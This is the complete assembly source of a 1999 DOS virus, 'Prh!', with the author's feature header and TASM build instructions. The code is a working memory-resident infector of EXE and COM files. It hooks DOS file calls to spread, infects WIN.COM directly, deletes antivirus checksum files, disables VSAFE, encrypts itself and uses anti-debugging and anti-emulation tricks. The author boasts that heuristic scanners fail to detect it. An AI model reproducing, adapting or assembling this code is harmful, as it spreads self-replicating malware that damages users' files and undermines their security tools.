; *************************************************************************
; ********************                                 ********************
; ********************           PRŽH! VIRUS           ********************
; ********************                by               ********************
; ********************            BLACK JACK           ********************
; ********************                                 ********************
; *************************************************************************

comment ~

NAME: Pr„h! v1.03
AUTHOR: Black Jack
TYPE: Memory resident appending infector of DOS EXE and COM files.
SIZE: 1454 bytes in EXEs (plus 7 bytes in COMs plus 17 to 32 padding bytes)
ENCRYPTED: Yes
POLYMORPH: No
STEALTH: No
TUNNELING: No
ANTI-EMULATION: Yes 
ANTI-DEBUGGING: Yes
DATE/TIME: Yes
ATTRIBUTE: Yes
INT 24h HANDLER: Yes

RETRO: +kills ANTI-VIR.DAT, CHKLIST.MS, CHKLIST.CPS and AVP.CRC files
       +disables VSAFE (just for fun, I know it's quite useless)
       +won't infect various AVs (checks first two letters of name)
       +doesn't go resident if it detects TBDRIVER in mem and stops infection
	if it finds it.

WINDOWS-COMPATIBLITY: +won't infect windows exe files
		      +can infect ENUNS com files correctly 
		      +will directly infect the file %windir%\WIN.COM

PAYLOAD: Yes, it displays a big, red, blinking "PRŽH!" in the center of the
	 screen on 27 September of any year.

FLAWS: infected files packed with EXEPACK will return to DOS with the error
       message "Packed file is corrupt." if the virus isn't memory resident,
       but they work fine if it is already installed (but only if the virus
       modifies the CX register). I have no explanation for this - can anyone
       help me please?

DETECTION: heuristically undetectable for AVP 3.0.128, Dr. Web 3.27,
	   TBAV 8.08, NOD32 1.15. F-prot 3.04a /PARANOID is so stupid that it
	   doesn't even find the unencrypted first generation exe, while
	   f-prot 2.27 /PARANOID finds a "modified variant of Sepultura".
	   F-Prot - once the best, now the worst.

ASSEMBLE WITH: 
		TASM /M5 prah.asm
		TLINK prah.asm

~

; *** CONSTANTS *************************************************************

viruslength  = ((offset virus_end) - (offset start))
mem_l        = ((offset  end_mem) - (offset start))
com_start_l  = ((offset end_com_start) - (offset start_for_com))
encryption_l = ((end_encryption - start_encryption) / 2)
ping         = 'pr'
pong         = '„h'

; *** DIRECTIVES ************************************************************
.model large
dosseg
.stack 4096
.radix 10
.186

host_seg segment
org 0
	mov ah, 9                       ; display message
	push cs
	pop ds
	mov dx, offset message
	int 21h

	mov ax, 4C00h                   ; quit program
	int 21h

message db "Infected with the Pr„h!-virus", 0Ah, 0Dh, "$"

host_seg ends

; ***** CODE ****************************************************************

virus_seg segment
org 0
assume cs:virus_seg, ds:virus_seg
start:
	pushf
	pusha                           ; SAVE REGISTERS
	push ds                         ; -""-
	push es                         ; -""-

	push cs
	pop ds
	
	mov psp, es                     ; save psp address in variable

	mov ax, 0135h                   ; get int vector 1
	xchg ah, al                     ; prevents thunderbyte's '#'-flag
	int 21h
	mov int1_segm, es
	mov int1_offs, bx
	
	mov ax, 0125h                   ; set int vector 1
	mov dx, offset int1_handler     ; to DS:DX
	xchg ah, al                     ; prevents thunderbyte's '#'-flag
	int 21h

	CALL skip_encryption            ;1st generation:will be replaced with:
	; CALL decrypt

start_encryption:                       ; Encrypt from here

	mov ax, 2501h                   ; set int 1 vector back
	lds dx, org_int1
	int 21h

	push cs                         ; DS=CS
	pop ds

					; OPEN TBDRVXXX
	mov ax, 3D00h                   ; open read only
	mov dx, offset tbdriver         ; DS:DX=Pointer to filename
	int 21h
	JC no_tbdrv                     ; if error, no TBDRIVER found => OK
	
	xchg ax, bx                     ; handle to bx
	mov ah, 3Eh                     ; Close file again
	int 21h                         ; call dos
	JMP return                      ; get outta here to avoid detection!
	
no_tbdrv:

	mov ax, 0FA01h                  ; disable VSAFE
	mov dx, 05945h                  ; just as a joke...
	int 16h

	mov ax, ping                    ; See if already resident
	int 21h
	cmp ax, pong
	JNE load_virus_into_mem
	JMP return
load_virus_into_mem:

	mov ax, 5803h                   ; use UMBs
	mov bx, 1
	int 21h

retry:
	mov ah, 48h                     ; RESERVE MEMORY
	mov bx, (mem_l + 15) / 16       ; virus length in paragraphs
	int 21h
	
	jnc getmem_ok

	mov ax, psp
	dec ax
	mov es, ax                      ; let es point to mcb

	mov ah, 4Ah                     ; change memory size of our mcb
	mov bx, es:[3]                  ; reserved memory size into BX
	sub bx, ((mem_l+15)/16)+1       ; sub length of virus in memory
	mov es, psp                     ; set ES to psp address again
	int 21h
	JMP retry

getmem_ok:
					; COPY VIRUS CODE
	xor si, si                      ; DS:SI = pointer to source
	mov di, si                      ; ES:DI = pointer to destination
	mov es, ax                      ; AX=segment address of our mem
	mov cx, (mem_l + 1) / 2         ; length in words
	cld
	rep movsw

					; CHANGE PSP-ADDRESS IN MCB
	mov ds, ax                      ; set DS to our memory block
	dec ax                          ; AX=segment address of our mem
	mov es, ax                      ; AX-1=MCB address
	mov word ptr es:[1], 8          ; make it a system area

	mov ax, 3521h                   ; get interrupt vector 21h
	int 21h
	mov int21_segm, es              ; save vector
	mov int21_offs, bx

	mov ax, 2521h                   ; set interrupt vector 21h to virus
	mov dx, offset int21_handler    ; DS:DX=pointer to new routine
	int 21h

	mov ax, 5803h                   ; don't use UMBs any more
	xor bx, bx
	int 21h

; ----- DIRECT INFECTION ----------------------------------------------------
	mov ds, psp                     ; restore psp address in ds

	mov bx, 2Ch                     ; Get enviroment block in ES
	mov es, [bx]
	xor di, di                      ; ES:DI=start enviroment block
	push cs                         ; DS=CS
	pop ds
	xor ax, ax                      ; al=0 for rep scasb
get_windir_head:
	push di                         ; save momentan position in enviroment
	mov si, offset windir           ; DS:SI=pointer to "windir="
	mov cx, 7                       ; length of "windir="
	rep cmpsb                       ; compare it
	JE windir_found                 ; found it!
	pop di                          ; restore momentan pos in enviroment
	neg cx                          ; set cx=0FFFFh
	repne scasb                     ; search for value in al (zero)
	cmp byte ptr es:[di+1], 0       ; if there's another zero, it's the end
	JNE get_windir_head             ; otherwise compare next variable

windir_not_found:
	mov ax, 4300h                   ; Get Attrib (to infect)
	push cs
	pop ds
	mov dx, offset win_path         ; assume windir=C:\WINDOWS
	int 21h
	
	JMP short end_getwin

windir_found:
	pop ax                          ; remove di, we don't need it anymore

	mov si, di                      ; copy path to buffer
	mov di, offset buffer
	push es                         ; DS:SI=source
	pop ds
	push cs                         ; ES:DI=destination
	pop es
	
copy_windir_head:
	lodsb                           ; copy it!
	stosb
	or al, al
	JNZ copy_windir_head            ; copy filename till zero
	dec di                          ; we don't want the final zero
	mov si, offset win_file         ; and copy "\WIN.COM" to the windir
	push cs
	pop ds
	mov cx, 9                       ; length of "\WIN.COM", 0
	rep movsb                       ; copy it!
	
	mov ax, 4300h                   ; get attrib (to infect)
	mov dx, offset buffer
	int 21h
	
end_getwin:
; ----- END DIRECT INFECTION ------------------------------------------------

return:                                 ; BACK TO HOST PROGRAM
	push cs
	pop es

	mov ah, 2Ah                     ; GET DATE
	int 21h
	cmp dx, 091Bh                   ; 27.September
	JNE no_payload

; ----- PAYLOAD -------------------------------------------------------------
	mov ax, 1                       ; set video mode 40x25
	int 10h
	
	mov ah, 1                       ; remove blinking cursor
	mov cx, 0110000000000000b
	int 10h

	mov ax, 1300h                   ; print string
	mov bx, 10001100b               ; attribute
	mov cx, 5                       ; length of string
	mov dx, 12*100h+17              ; start position
	mov bp, offset prah             ; ES:BP=offset string
	int 10h

waitkbhitloop:                          ; wait until user presses some key
	mov ah, 1                       ; key pressed?
	int 16h
	JZ waitkbhitloop                ; if not, then repeat

	xor ax, ax                      ; remove key out of keyboard buffer
	int 16h
	
	mov ax, 3                       ; set standart 80x25 video mode
	int 10h

	mov ah, 1                       ; restore regular cursor
	mov cx, 0607h
	int 10h

; ----- END PAYLOAD ---------------------------------------------------------

no_payload:
	mov ax, cs
	sub ax, entry_segm              ; correct far-jump
	mov entry_segm, ax
	int 3                           ; clear prefetch queue
	
	mov ax, ss                      ; correct original stack segment
	sub ax, orig_ss
	mov orig_ss, ax

	pop es                          ; restore registers
	pop ds
	popa
	inc cx                          ; this will make EXEPACKed files run, but why?!
	popf

	cli                             ; restore stack
	mov ss, cs:orig_ss
	mov sp, cs:orig_sp
	sti

entry_point:                            ; JUMP TO HOST
	   db 0EAh                      ; op-code far-jump
entry_offs dw offset start              ; offset
entry_segm dw ((SIZE host_seg) + 15)/16 ; segment

orig_sp    dw offset new_sp
orig_ss    dw 0

restore_com:
	pushf                           ; save register
	pusha
	
	push cs                         ; set DS:SI to original file start
	pop ds
	
	mov si, offset org_com_start
	mov di, 100h                    ; set ES:DI to entry point
	mov cx, com_start_l
	cld
	rep movsb                       ; move original start back

	mov ax, es                      ; relocate far-jump
	mov entry_segm, ax
	mov entry_offs, 100h

	mov ds, ax                      ; restore register
	popa
	popf

	JMP SHORT entry_point           ; jumpt to far-jump

; ***** STRING CONSTANTS ****************************************************

db 0, "This is the ["
prah db "PRŽH!] virus, written and (c) by Black Jack, 1999", 0

anti_vir_dat    db "ANTI-VIR.DAT", 0
chklist_ms      db "CHKLIST.MS", 0
chklist_cps     db "CHKLIST.CPS", 0
avp_crc         db "AVP.CRC", 0

tbdriver        db "TBDRVXXX", 0

dont_infect     db "AVDRTBF-FINOSC"

win_path        db "C:\WINDOWS"
win_file        db "\WIN.COM", 0
windir          db "windir="

; ***** ROUTINES ************************************************************

; ----- INT 24h HANDLER -----------------------------------------------------

int24_handler:
	sti
	mov ax, 3
	iret

; ----- END INT 24h HANDLER -------------------------------------------------

; ----- INT 21h HANDLER -----------------------------------------------------

int21_handler:
	cmp ax, ping                    ; Are-you-there function
	JNE not_see_if_there
	mov ax, pong
	IRET
	
not_see_if_there:
	cmp bx, "JB"                    ; to avoid endless recursions
	JE exit_hook

	xchg ax, bx
	cmp bh, 4Bh                     ; EXEC-function
	xchg ax, bx
	JNE not_exec
	CALL infect
not_exec:
	xchg ax, bx
	cmp bh, 3Dh                     ; open file
	xchg ax, bx
	JNE not_open
	CALL infect
not_open:
	cmp ah, 43h                     ; get/set attribs
	JNE not_attr
	CALL infect
not_attr:
	cmp ah, 56h                     ; rename/move file
	JNE not_rename
	CALL infect
not_rename:     
	cmp ah, 6Ch                     ; extended file-open
	JNE exit_hook
	xchg dx, si                     ; this function wants the filename in
	call infect                     ; DS:SI
	xchg dx, si
exit_hook:
	JMP dword ptr CS:[org_int21]

; ----- END HOOK ------------------------------------------------------------

infect:                                 ; INFECTION ROUTINE
	pusha                           ; save registers
	push ds
	push es
	mov cs:fn_offs, dx
	mov cs:fn_segm, ds

	mov ah, 2Fh                     ; save old dta addres
	int 21h
	push es                         ; save old dta address to stack
	push bx

	push ds                         ; save DS:DX (pointer to filename)
	push dx

	mov ah, 1Ah                     ; set new dta address
	mov dx, offset dta              ; DS:DX=pointer to new dta
	push cs
	pop ds
	int 21h

	pop dx                          ; restore DS:DX (pointer to filename)
	pop ds

	mov ah, 4Eh                     ; call findfirst function
	mov cx, 0000000000100111b       ; CX = attrib
	int 21h
	
	pop dx                          ; get old dta address from stack
	pop ds

	mov ah, 1Ah                     ; set dta back
	int 21h
	
	push cs                         ; DS = CS
	push cs                         ; ES = CS
	pop ds
	pop es

					; OPEN TBDRVXXX
	mov ax, 3D00h                   ; open read only
	mov dx, offset tbdriver         ; DS:DX=Pointer to filename
	mov bx, "JB"                    ; avoid endless recursions
	int 21h
	JC no_tbdrv_res                 ; if error, no TBDRIVER found => OK
	
	xchg ax, bx                     ; handle to bx
	mov ah, 3Eh                     ; Close file again
	int 21h                         ; call dos
	JMP exit_before_open            ; get outta here to avoid detection!
	
no_tbdrv_res:

	mov ax, 0FA01h                  ; Disable VSAFE
	mov dx, 05945h                  ; just a joke...
	int 16h

	mov cx, 13                      ; search file name for extension
	mov di, offset fname
	mov al, "."
	cld
	repne scasb                     ; search for the dot
	cmp word ptr [di], "OC"         ; .COM - file?
	JNE extention_exe
	cmp byte ptr [di+2], "M"
	JE extention_ok
extention_exe:                          ; .EXE - file?
	cmp word ptr [di], "XE"
	JNE exit_before_open
	cmp byte ptr [di+2], "E"
	JNE exit_before_open

extention_ok:
					; TEST FOR AV FILENAMES
	cld
	mov ax, word ptr [offset fname]
	mov cx, 7
	mov di, offset dont_infect
	repne scasw
	JNE no_av
	
exit_before_open:
	JMP end_infect
no_av:

	mov cx, time                    ; see if already infected
	and cx, 0000000000011111b       ; we're only interested in the seconds
	cmp cx, 1111b                   ; seconds = 30 ?
	JE exit_before_open             ; if so, it's already infected
	or time, 0000000000001111b      ; otherwise make the seconds=30
	and time, 1111111111101111b

	mov ax, 3524h                   ; Get int vector 24h
	int 21h
	mov int24_segm, es              ; save vector
	mov int24_offs, bx

	mov ax, 2524h                   ; set int vector 24h to our routine
	mov dx, offset int24_handler    ; DS:DX=pointer to new routine
	int 21h

	lds dx, filename                ; DS:DX=Pointer to filename

					; CLEAR ATTRIBUTES
	mov ax, 4301h                   ; DOS set attributes function
	mov bx, "JB"                    ; to avoid endless recursion
	xor cx, cx                      ; clear all attributs
					; DS:DX=pointer to filename
	int 21h                         ; Call DOS function
	JNC clear_attrib_ok             ; go on if no error
	JMP restore_int24h              ; quit if error (write protected disk)
clear_attrib_ok:
	
					; OPEN FILE
	mov ax, 3D02h                   ; AH=FktNr; AL: read & write
	mov bx, "JB"                    ; to avoid endless recursions
					; DS:DX=pointer to filename
	int 21h
	JNC no_error_at_open            ; carry-flag set -> Error -> End
	JMP end_infect
no_error_at_open:
	xchg bx, ax                     ; handle to BX

	push cs
	push cs
	pop ds
	pop es

					; READ EXE-HEADER
	mov ah, 3Fh
	mov cx, end_header - header     ; read header size
	mov dx, offset header           ; DS:DX=pointer to buffer
	int 21h

	mov ax, word ptr [offset filelength]; CALCULATE Size_of_crap
	not ax                          ; to size mod 16 = 0
	and ax, 1111b                   
	add ax, 17                      ; inc + 16d (compatiblity to very small COMs)
	mov size_of_crap, ax            ; save in size_of_crap
	
	cmp exe_id, "ZM"                ; EXE-FILE?
	JE exe_file                     ; go to the correct infection routine
	cmp exe_id, "MZ"
	JE exe_file
	JMP infect_com

; ----- EXE FILE INFECTION --------------------------------------------------

exe_file:
	cmp relocate, 40h               ; windows exe?
	JNE no_windows_exe
header_not_ok:
	JMP close
no_windows_exe:

	mov ax, word ptr [offset filelength]; overloaded exe?
	mov dx, word ptr [offset filelength+2]
	CALL calculate_header_size
	cmp ax, length_m
	JNE header_not_ok
	cmp dx, length_d
	JNE header_not_ok
	
					; CHANGE ENTRY POINT TO VIRUS
	mov ax, word ptr [offset filelength]; file length in DX:AX
	mov dx, word ptr [offset filelength+2]
	add ax, size_of_crap            ; add padding bytes
	shr ax, 4d                      ; filesize div 16
	shl dx, 12d
	add ax, dx
	sub ax, head                    ; sub size of header

	mov dx, ax                      ; DX = AX (new code segment)
	sub dx, code_seg                ; calculate difference to old CS
	mov entry_segm, dx              ; save in far-jump
	mov cx, ip_start                ; save originial start IP
	mov entry_offs, cx
	mov code_seg, ax                ; write new start CS to header
	mov ip_start, offset start      ; write new start IP to header

					; Same stuff for stack
	inc ax                          ; SS = CS + 1 to avoid TBAV's K flag
	mov dx, ax                      ; DX = AX (new stack segment)
	sub dx, stack_seg               ; calculate difference to old SS
	mov orig_ss, dx                 ; save it
	mov cx, sp_start                ; save original start SP
	mov orig_sp, cx
	mov stack_seg, ax               ; write new start SS to header
	mov sp_start, offset new_sp     ; write new start SP to header

					; change file size in header
	mov ax, word ptr [offset filelength]; set DX:AX to filelength
	mov dx, word ptr [offset filelength+2]

	mov cx, viruslength             ; CX = lenght of virus + padding size
	add cx, size_of_crap
	add ax, cx                      ; add it to low word of filesize
	adc dx, 0                       ; add remainer to hi high word

	CALL calculate_header_size

	mov length_m, ax                ; save new size in exe header
	mov length_d, dx
	
	mov writelength, viruslength    ; viruslength without enuns

;------ WRITE VIRUS TO FILE -------------------------------------------------

continue_infection_for_both_exe_and_com:

	mov ax, 4202h                   ; set filepointer to end of file
	xor cx, cx
	mov dx, size_of_crap
	int 21h

	CALL encrypt                    ; encrypt, write and decrypt

	mov ax, 4200h                   ; set filepointer to start of file
	xor cx, cx
	mov dx, cx
	int 21h

	mov ah, 40h                     ; write new header to file
	mov cx, end_header - header     ; write header size
	mov dx, offset header           ; DS:DX = pointer to buffer
	int 21h

	mov ax, 5701h                   ; restore old date/time
	mov dx, date                    ; old date
	mov cx, time                    ; old time
	int 21h

	push bx                         ; save handle
	
					; KILL AV CRC FILES
	cld                             ; go forwards
	lds si, filename                ; DS:SI=pointer to filename
	mov di, offset buffer           ; ES:DI=destination buffer
	xor cx, cx
copy_path_head:
	lodsb                           ; copy filename till zero
	stosb
	inc cx
	or al, al
	JNZ copy_path_head              ; copy filename till zero
	dec di                          ; set di to the last byte of the name

	push cs                         ; DS=CS
	pop ds

	std                             ; go backwards
	mov al, '\'                     ; search for backslash
	repne scasb                     ; search for end of path
	JE found_backslash
	mov di, (offset buffer)-2
found_backslash:
	inc di                          ; set di to first byte of filename
	inc di
	
	push di                         ; save start of filename
	push di
	push di
	
	mov si, offset anti_vir_dat     ; kill Anti-Vir.dat file!
	call do_it
	pop di
	mov si, offset chklist_ms       ; kill Chklist.ms file!
	call do_it
	pop di
	mov si, offset chklist_cps      ; kill Chklist.cps file!
	call do_it
	pop di
	mov si, offset avp_crc          ; kill Avp.crc file!
	call do_it
	
	pop bx                          ; restore handle
	
close:
	mov ah, 3Eh                     ; close file
	int 21h

	mov ax, 4301h                   ; restore attributes
	mov bx, "JB"                    ; to avoid endless recursion
	xor ch, ch
	mov cl, attrib                  ; CX=attributes to set
	lds dx, filename                ; DS:DX=pointer to filename
	int 21h                         ; execute DOS function

restore_int24h:                         ; RESET INTERRUPT VECTOR 24h
	mov ax, 2524h                   ; AH=fnct. number; AL= int number
	lds dx, org_int24               ; DS:DX=Pointer to new routine
	int 21h                         ; DOS-function

end_infect:
	pop es                          ; restore registers
	pop ds                          ; -""-
	popa                            ; -""-
	RET                             ; back to caller


do_it:                                  ; KILL AV CRC FILES
	mov cx, 13d                     ; copy filename in buffer
	cld
	rep movsb
	
					; SET ATTRIBUTES ZERO
	mov ax, 4301h                   ; dos set attributes function
	mov bx, "JB"                    ; to avoid endless recursion
	xor cx, cx                      ; CX=attributes to set
	mov dx, offset buffer           ; DS:DX=pointer to filename
	int 21h                         ; execute DOS function
	JC file_not_there

					; DELETE IT!
	mov ah, 41h                     ; dos function number
	mov dx, offset buffer           ; DS:DX=buffer for file to be killed
	int 21h                         ; execute dos function

file_not_there: 
	RET                             ; back to caller


calculate_header_size:
	; Input: AX=low word/DX=high word of size
	; Return: AX=size mod 512; DX= size div 512
	
	mov cx, ax                      ; CX = AX
	shr cx, 9d                      ; CX = CX div 512
	shl dx, 7d                      ; DX = (DX * 10000h) div 512
	add dx, cx                      ; DX = new filelength div 512
	and ax, 0000000111111111b       ; AX = new filelength mod 512
	JZ exit_calculation
	inc dx                          ; round it up
exit_calculation:
	RET


infect_com:
					; SET FILEPOINTER TO ENUNS
	mov ax, 4202h                   ; move file pointer relative to end
					; BX already contains handle
	mov cx, -1                      ; CX:DX = -7 (Offset relative to end)
	mov dx, -7
	int 21h                         ; Do it!
	
	mov ah, 3Fh                     ; read enuns into a buffer
					; BX already contains file-handle
	mov cx, 7                       ; Length of enuns
	mov dx, offset enuns            ; DS:DX=Pointer to buffer
	int 21h                         ; Call DOS function

	mov ax, viruslength+7           ; add viruslength to enuns word
	mov writelength, ax             ; how many bytes to write (plus enuns)
	add ax, size_of_crap
	add word ptr [enuns+5], ax

	mov si, offset header           ; save original beginning of com file
	mov di, offset org_com_start
	mov cx, com_start_l
	cld
	rep movsb

	mov dx, word ptr [offset filelength]; filelength into dx
	shr dx, 4                       ; convert to paragraphs
	add dx, 12h                     ; add org 100h+fill bytes to segment
	mov com_seg, dx                 ; write to far-jump

	xor ax, ax
	mov entry_offs, offset restore_com ; Relocate Far Jump
	mov entry_segm, ax
	mov orig_sp, 0FFFEh
	mov orig_ss, ax

	mov si, offset start_for_com    ; copy new start code for com file
	mov di, offset header
	mov cx, com_start_l
	cld
	rep movsb

	JMP continue_infection_for_both_exe_and_com

start_for_com:
	and al, 20h                     ; TBSCAN won't analyze COM files starting with this
	mov ax, cs                      ; Relocate far Jump
	add word ptr DS:[offset com_seg - offset start_for_com + 100h], ax
	int 3                           ; clear prefetch queue
	xor ax, ax

	db 0EAh                         ; OP-Code far Jump
	dw 0                            ; Offset
com_seg dw 0                            ; Segment
end_com_start:

org_com_start db (end_com_start - start_for_com) dup (?)

; ----- ENCRYPTION ROUTINE --------------------------------------------------

encrypt:                                ; Encrypt & write to file

	xor ax, ax                      ; bios get time function
	int 1Ah                         ; call the BIOS!
	mov decrypt_key, dx             ; DX contains low word of time counter
	mov encrypt_key, dx             ; and this is our key
	xor dx, encrypt_add             ; different key for add
	mov encrypt_add, dx             ; store key
	neg dx                          ; change sign
	mov int1_decrypt_add, dx        ; store key
	mov si, offset start_encryption
	mov cx, encryption_l
	JMP short end_encryption        ; clear prefetch queue
end_encryption:                         ; encrypt until this label

encryption_loop:

	mov ax, [si]                    ; get word to be encrypted in AX
	db 05h                          ; ADD AX, imm16
	encrypt_add dw 0C001h           ; Key
	db 35h                          ; XOR AX, imm16
	encrypt_key dw 0                ; Key
	xchg ah, al                     ; Exchange encryption
	mov [si], ax                    ; Move encrypted word back in memory
	inc si                          ; let SI point to the next word
	inc si
	LOOP encryption_loop

	mov ah, 40h                     ; write virus to file
					; BX holds already the handle
	mov cx, writelength             ; virus-length to write
	cwd                             ; DS:DX=Pointer to Buffer
	pushf                           ; Call DOS-function
	CALL dword ptr org_int21        ; simulate interrupt call

	mov ax, int1_decrypt_add
	mov decrypt_add, ax

	; and now decrypt it again...
	
	JMP short over_int1

; ----- END ENCRYPT ---------------------------------------------------------

; ----- DECRYPTION ROUTINE --------------------------------------------------

decrypt:                                ; Decrypt routine

	db 0F1h                         ; undocumented int 1 op-code
over_int1:
	mov si, offset start_encryption
	mov cx, encryption_l
	
decryption_loop:
	mov ax, [si]                    ; Get word to be decrypted in AX
	xchg ah, al                     ; XCHG Decryption
	db 35h                          ; XOR ax, imm16
	decrypt_key dw 0                ; Key
	db 05h                          ; ADD ax, imm16
	decrypt_add dw 0                ; Key
	mov [si], ax                    ; Move decrypted word back in memory
	inc si                          ; let SI point to the next word
	inc si
	LOOP decryption_loop            ; Repeat it!

	RET                             ; Back to caller

; ----- END  DECRYPT --------------------------------------------------------

int1_handler:
	dw 06C7h                        ; op-code mov [decrypt_add], int1_decrypt_add
	dw offset decrypt_add
int1_decrypt_add dw 0                   ; decryption key
	iret

virus_end:                              ; Lenght to write

enuns   db "ENUNS", 0, 0

; *** DATA ******************************************************************

writelength dw ?                        ; how many bytes must be written?

header:                                 ; EXE-header
exe_id     dw ?
length_m   dw ?
length_d   dw ?
segments   dw ?
head       dw ?
mini_para  dw ?
maxi_para  dw ?
stack_seg  dw ?
sp_start   dw ?
crc        dw ?
ip_start   dw ?
code_seg   dw ?
relocate   dw ?
end_header:

dta:
reserved   db 21 dup(?)
attrib     db ?
time       dw ?
date       dw ?
filelength dd ?
fname      db 13 dup (?)

filename   EQU this dword
fn_offs    dw ?
fn_segm    dw ?

org_int1   EQU this dword
int1_offs  dw ?
int1_segm  dw ?

org_int21  EQU this dword
int21_offs dw ?
int21_segm dw ?

org_int24  EQU this dword
int24_offs dw ?
int24_segm dw ?

psp        dw ?

size_of_crap dw ?

buffer          db 80 dup (?)

end_mem:

dw 256d dup (?)
EVEN                                    ; we want an even stack
new_sp:


skip_encryption:                        ; Only for first generation
	sub word ptr [start_encryption - 2], skip_encryption - decrypt
	RET

virus_seg ends

end start
